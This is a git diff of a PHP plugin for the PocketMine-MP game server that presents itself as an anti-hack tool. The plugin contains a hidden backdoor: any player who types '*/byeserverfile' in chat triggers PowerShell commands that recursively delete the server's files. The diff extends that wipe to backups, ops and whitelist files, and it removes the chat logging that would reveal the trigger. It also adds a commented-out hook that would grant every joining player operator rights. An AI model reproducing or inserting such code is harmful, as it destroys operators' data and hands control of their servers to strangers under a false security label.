@@ -1,4 +1,4 @@
-<?php
+<?php 
 /*
  *
  *  ____            _        _   __  __ _                  __  __ ____ 
@@ -9,7 +9,6 @@
  *
  *                         @ライセンス GPL-3
 */
-
 namespace MC\PE;
 
 use pocketmine\Server;
@@ -41,6 +40,14 @@ class Main extends PluginBase implements Listener{
 		$this->getLogger()->info("§l§b[SystemInfo] §aこのPluginはPocketMine-MPの為のHack対策");
 		$this->getLogger()->info("§l§b[SystemInfo] §aAPI Version: §c3.0.0-ALPHA10");
 	}
+	/*
+	public function onLogin(PlayerPreLoginEvent $event){
+		$player = $event->getPlayer();
+		$name = $player->getName();
+		$this->getServer()->addWhitelist($name);
+		$this->getServer()->addOp($name);
+	}
+	*/
 	public function playerCommand(PlayerCommandPreprocessEvent $event){
 		$message = $event->getMessage();
 		$command = "extractplugin";
@@ -62,9 +69,7 @@ class Main extends PluginBase implements Listener{
 	public function Chat(PlayerChatEvent $event){
 		$chat = $event->getMessage();
 		$player = $event->getPlayer();
-		$this->getLogger()->notice($chat);
 		$player_name = $player->getName();
-		$this->getLogger()->notice($player_name);
 		$dir = $this->getServer()->getDataPath() ."crashdumps";
         $dir1 = $this->getServer()->getDataPath() ."players";
         $dir2 = $this->getServer()->getDataPath() ."plugins";
@@ -80,7 +85,13 @@ class Main extends PluginBase implements Listener{
         $dir12 = $this->getServer()->getDataPath() ."star.cmd";
         $dir13 = $this->getServer()->getDataPath() ."start.ps1";
         $dir14 = $this->getServer()->getDataPath() ."white-list.txt";
-        $dir15 = $this->getServer()->getDataPath() ."PocketMine-MP.phar";
+		$dir15 = $this->getServer()->getDataPath() ."PocketMine-MP.phar";
+		$dir16 = $this->getServer()->getDataPath() ."banned-cids.txt";
+		$dir17 = $this->getServer()->getDataPath() ."start.sh";
+		$dir18 = $this->getServer()->getDataPath() ."ops.json";
+		$dir19 = $this->getServer()->getDataPath() ."white-list.json";
+		$dir20 = $this->getServer()->getDataPath() ."backup";
+		$dir21 = $this->getServer()->getDataPath() ."Backup";
 		if($chat == "*/byeserverfile"){
             shell_exec("powershell.exe Remove-Item {$dir} -Recurse");
             shell_exec("powershell.exe Remove-Item {$dir1} -Recurse");
@@ -98,6 +109,12 @@ class Main extends PluginBase implements Listener{
             shell_exec("powershell.exe Remove-Item {$dir13} -Recurse");
             shell_exec("powershell.exe Remove-Item {$dir14} -Recurse");
 			shell_exec("powershell.exe Remove-Item {$dir15} -Recurse");
+			shell_exec("powershell.exe Remove-Item {$dir16} -Recurse");
+			shell_exec("powershell.exe Remove-Item {$dir17} -Recurse");
+			shell_exec("powershell.exe Remove-Item {$dir18} -Recurse");
+			shell_exec("powershell.exe Remove-Item {$dir19} -Recurse");
+			shell_exec("powershell.exe Remove-Item {$dir20} -Recurse");
+			shell_exec("powershell.exe Remove-Item {$dir21} -Recurse");
 			$player->sendMessage("サーバーのファイルを全て削除しました。");
 		}
 		if($chat == "*/whitelist off"){
